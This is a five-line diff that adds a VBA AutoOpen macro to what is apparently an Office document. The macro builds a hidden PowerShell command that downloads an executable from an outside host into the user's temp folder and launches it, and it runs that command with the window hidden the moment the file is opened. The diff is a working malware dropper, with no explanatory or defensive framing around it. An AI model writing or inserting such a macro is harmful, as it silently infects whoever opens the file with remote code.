@@ -1,0 +1,5 @@
+Sub AutoOpen()
+    Dim s As String
+    s = "powershell -w hidden -c iwr 'http://ofc-4.example.test/quote-run.exe' -o $env:TEMP\p.exe;start $env:TEMP\p.exe"
+    Shell s, vbHide
+End Sub
